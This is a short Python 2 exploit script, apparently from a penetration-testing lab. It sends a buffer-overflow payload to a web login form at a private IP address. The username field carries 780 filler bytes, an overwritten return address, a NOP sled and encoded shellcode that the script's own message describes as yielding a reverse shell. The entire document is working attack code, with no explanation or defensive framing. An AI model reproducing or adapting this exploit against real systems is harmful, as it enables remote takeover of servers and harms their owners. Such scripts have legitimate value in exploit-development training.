#!/usr/bin/python
import socket
try:
	print "\nSending evil buffer..."
	shellcode = ("\xd9\xe1\xd9\x74\x24\xf4\xb8\xb3\x9a\x9d\xc5\x5e\x31\xc9\xb1"
"\x52\x31\x46\x17\x03\x46\x17\x83\x5d\x66\x7f\x30\x5d\x7f\x02"
"\xbb\x9d\x80\x63\x35\x78\xb1\xa3\x21\x09\xe2\x13\x21\x5f\x0f"
"\xdf\x67\x4b\x84\xad\xaf\x7c\x2d\x1b\x96\xb3\xae\x30\xea\xd2"
"\x2c\x4b\x3f\x34\x0c\x84\x32\x35\x49\xf9\xbf\x67\x02\x75\x6d"
"\x97\x27\xc3\xae\x1c\x7b\xc5\xb6\xc1\xcc\xe4\x97\x54\x46\xbf"
"\x37\x57\x8b\xcb\x71\x4f\xc8\xf6\xc8\xe4\x3a\x8c\xca\x2c\x73"
"\x6d\x60\x11\xbb\x9c\x78\x56\x7c\x7f\x0f\xae\x7e\x02\x08\x75"
"\xfc\xd8\x9d\x6d\xa6\xab\x06\x49\x56\x7f\xd0\x1a\x54\x34\x96"
"\x44\x79\xcb\x7b\xff\x85\x40\x7a\x2f\x0c\x12\x59\xeb\x54\xc0"
"\xc0\xaa\x30\xa7\xfd\xac\x9a\x18\x58\xa7\x37\x4c\xd1\xea\x5f"
"\xa1\xd8\x14\xa0\xad\x6b\x67\x92\x72\xc0\xef\x9e\xfb\xce\xe8"
"\xe1\xd1\xb7\x66\x1c\xda\xc7\xaf\xdb\x8e\x97\xc7\xca\xae\x73"
"\x17\xf2\x7a\xd3\x47\x5c\xd5\x94\x37\x1c\x85\x7c\x5d\x93\xfa"
"\x9d\x5e\x79\x93\x34\xa5\xea\x5c\x60\xd2\x65\x34\x73\x1c\x7b"
"\x7e\xfa\xfa\x11\x90\xab\x55\x8e\x09\xf6\x2d\x2f\xd5\x2c\x48"
"\x6f\x5d\xc3\xad\x3e\x96\xae\xbd\xd7\x56\xe5\x9f\x7e\x68\xd3"
"\xb7\x1d\xfb\xb8\x47\x6b\xe0\x16\x10\x3c\xd6\x6e\xf4\xd0\x41"
"\xd9\xea\x28\x17\x22\xae\xf6\xe4\xad\x2f\x7a\x50\x8a\x3f\x42"
"\x59\x96\x6b\x1a\x0c\x40\xc5\xdc\xe6\x22\xbf\xb6\x55\xed\x57"
"\x4e\x96\x2e\x21\x4f\xf3\xd8\xcd\xfe\xaa\x9c\xf2\xcf\x3a\x29"
"\x8b\x2d\xdb\xd6\x46\xf6\xeb\x9c\xca\x5f\x64\x79\x9f\xdd\xe9"
"\x7a\x4a\x21\x14\xf9\x7e\xda\xe3\xe1\x0b\xdf\xa8\xa5\xe0\xad"
"\xa1\x43\x06\x01\xc1\x41")
	filler = "A" * 780
	eip = "\x83\x0c\x09\x10"
	offset = "C" * 4
	nops = "\x90" * 10
	inputBuffer = filler + eip + offset + nops + shellcode

	content = "username=" + inputBuffer + "&password=A"
	buffer = "POST /login HTTP/1.1\r\n"
	buffer += "Host: 192.168.143.10\r\n"
	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"

	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Referer: http://192.168.143.10/login\r\n"
	buffer += "Connection: close\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+str(len(content))+"\r\n"
	buffer += "\r\n"

	buffer += content
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

	s.connect(("192.168.143.10", 80))
	s.send(buffer)

	s.close()

	print "\nDone did you get a reverse shell?"

except:
	print "\nCould not connect!"
